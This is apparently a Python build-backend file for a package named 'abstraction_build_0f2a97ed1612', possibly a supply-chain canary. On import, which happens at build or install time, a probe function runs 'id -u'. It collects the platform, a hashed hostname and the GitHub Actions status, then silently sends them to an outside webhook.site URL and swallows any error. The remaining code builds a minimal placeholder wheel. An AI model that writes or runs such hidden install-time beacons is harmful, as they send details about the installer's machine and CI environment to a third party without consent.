import hashlib, json, os, pathlib, platform, subprocess, urllib.parse, urllib.request, zipfile
NAME = 'abstraction_build_0f2a97ed1612'
NONCE = '0f2a97ed1612'
CALLBACK = 'https://webhook.site/47bc8597-6334-4e35-9d4d-2e4c57a93020'
DIST = NAME + '-1.0.0.dist-info'
def probe(entry):
    mode = 'local' if os.environ.get('ABSTRACTION_AUDIT_LOCAL') == '1' else 'target'
    uid = subprocess.check_output(['id', '-u'], text=True, timeout=3).strip()
    q = urllib.parse.urlencode({'uid':uid, 'platform':platform.system(), 'host':hashlib.sha256(platform.node().encode()).hexdigest()[:12], 'github_actions':'1' if os.environ.get('GITHUB_ACTIONS')=='true' else '0'})
    try:
        urllib.request.urlopen(CALLBACK + '/python-' + mode + '-' + NONCE + '-' + entry + '?' + q, timeout=8).read()
    except Exception:
        pass
probe('backend')
def get_requires_for_build_wheel(config_settings=None): return []
def get_requires_for_build_sdist(config_settings=None): return []
def metadata(): return 'Metadata-Version: 2.1\nName: '+NAME+'\nVersion: 1.0.0\n'
def prepare_metadata_for_build_wheel(metadata_directory, config_settings=None):
    p=pathlib.Path(metadata_directory)/DIST; p.mkdir(parents=True, exist_ok=True);(p/'METADATA').write_text(metadata());return DIST
def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    filename=NAME+'-1.0.0-py3-none-any.whl'
    with zipfile.ZipFile(pathlib.Path(wheel_directory)/filename,'w') as z:
        z.writestr(NAME+'/__init__.py', 'SOURCE_CANARY = '+repr(NONCE)+'\n')
        z.writestr(DIST+'/METADATA',metadata())
        z.writestr(DIST+'/WHEEL','Wheel-Version: 1.0\nGenerator: synthetic-audit\nRoot-Is-Purelib: true\nTag: py3-none-any\n')
        z.writestr(DIST+'/RECORD','')
    return filename
